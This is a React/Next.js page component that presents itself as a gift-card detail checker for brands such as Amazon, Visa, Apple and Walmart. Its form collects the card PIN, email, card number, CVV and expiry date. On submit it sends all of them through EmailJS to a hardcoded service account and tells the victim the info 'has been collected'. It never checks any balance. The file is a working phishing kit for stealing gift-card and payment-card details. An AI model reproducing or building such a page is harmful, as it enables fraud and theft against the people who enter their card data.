import { useState } from 'react';
import emailjs from 'emailjs-com';
import styles from '../../styles/GiftCard.module.css'; // Import the existing CSS file

const giftCardProviders = [
  { id: 'amazon', name: "Amazon", imageUrl: "/assets/amazon.jpeg" },
  { id: 'visa', name: "Visa", imageUrl: "/assets/visa.png" },
  { id: 'mastercard', name: "Mastercard", imageUrl: "/assets/mastercard.jpeg" },
  { id: 'walmart', name: "Walmart", imageUrl: "/assets/walmart.jpeg" },
  { id: 'target', name: "Target", imageUrl: "/assets/target.jpeg" },
  { id: 'starbucks', name: "Starbucks", imageUrl: "/assets/starbucks.png" },
  { id: 'apple', name: "Apple", imageUrl: "/assets/apple.jpeg" },
  { id: 'googleplay', name: "Google Play", imageUrl: "/assets/googleplay.png" },
  { id: 'bestbuy', name: "Best Buy", imageUrl: "/assets/bestbuy.jpeg" },
  { id: 'homedepot', name: "Home Depot", imageUrl: "/assets/homedepot.jpeg" },
  { id: 'sephora', name: "Sephora", imageUrl: "/assets/sephora.jpg" },
  { id: 'nike', name: "Nike", imageUrl: "/assets/nike.jpeg" },
  { id: 'adidas', name: "Adidas", imageUrl: "/assets/adidas.png" },
  { id: 'bathandbodyworks', name: "Bath & Body Works", imageUrl: "/assets/bathandbodyworks.jpeg" },
  { id: 'lowes', name: "Lowe's", imageUrl: "/assets/lowes.jpeg" },
  { id: 'gamestop', name: "GameStop", imageUrl: "/assets/gamestop.jpeg" },
  { id: 'uber', name: "Uber", imageUrl: "/assets/uber.webp" },
  { id: 'netflix', name: "Netflix", imageUrl: "/assets/netflix.png" },
  { id: 'disney', name: "Disney", imageUrl: "/assets/disney.jpeg" },
  { id: 'chilis', name: "Razorgold", imageUrl: "/assets/razorgold.jpeg" },
  { id: 'kroger', name: "Kroger", imageUrl: "/assets/kroger.jpeg" },
];

export default function GiftCard({ id }) {
  const card = giftCardProviders.find(card => card.id === id);
  const [formData, setFormData] = useState({ pin: '', email: '', cardNumber: '', cvv: '', expiryDate: '' });
  const [popupMessage, setPopupMessage] = useState('');

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    emailjs.send('service_ozea06x', 'template_hjohb6l', formData, 'XMOnwjyzQDoRVRYl3')
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
        setPopupMessage('Your info has been collected for processing.');
      }, (error) => {
        console.log('FAILED...', error);
        setPopupMessage('Your info wasn\'t accepted, sorry.');
      });
  };

  return (
    <div className={styles.container}>
      <header className={styles.header}>
        <h1>CHECK YOUR CARD DETAILS</h1>
      </header>
      <main className={styles.main}>
        <div className={styles.cardDetails}>
          <p>You have selected the {card.name} gift card.</p>
          <img src={card.imageUrl} alt={`${card.name} Gift Card`} className={styles.cardImage} />
          <form className={styles.form} onSubmit={handleSubmit}>
            <label htmlFor="pin" className={styles.label}>Card pin:</label>
            <input type="text" id="pin" name="pin" className={styles.input} value={formData.pin} onChange={handleChange} />
            <label htmlFor="email" className={styles.label}>Email Address:</label>
            <input type="email" id="email" name="email" className={styles.input} value={formData.email} onChange={handleChange} />
            <label htmlFor="cardNumber" className={styles.label}>Card Number (optional):</label>
            <input type="text" id="cardNumber" name="cardNumber" className={styles.input} value={formData.cardNumber} onChange={handleChange} />
            <label htmlFor="cvv" className={styles.label}>CVV (optional):</label>
            <input type="text" id="cvv" name="cvv" className={styles.input} value={formData.cvv} onChange={handleChange} />
            <label htmlFor="expiryDate" className={styles.label}>Expiry Date (optional):</label>
            <input type="text" id="expiryDate" name="expiryDate" className={styles.input} value={formData.expiryDate} onChange={handleChange} />
            <p className={styles.optionalText}>Note: Only some gift card providers require this information.</p>
            <button type="submit" className={styles.submitButton}>Submit</button>
          </form>
        </div>
        {popupMessage && <div className={styles.popup}>{popupMessage}</div>}
      </main>
      <footer className={styles.footer}>
        <p>&copy; 2023 Gift Card Hub. All rights reserved.</p>
      </footer>
    </div>
  );
}

export async function getServerSideProps(context) {
  const { id } = context.query;
  return {
    props: { id },
  };
}
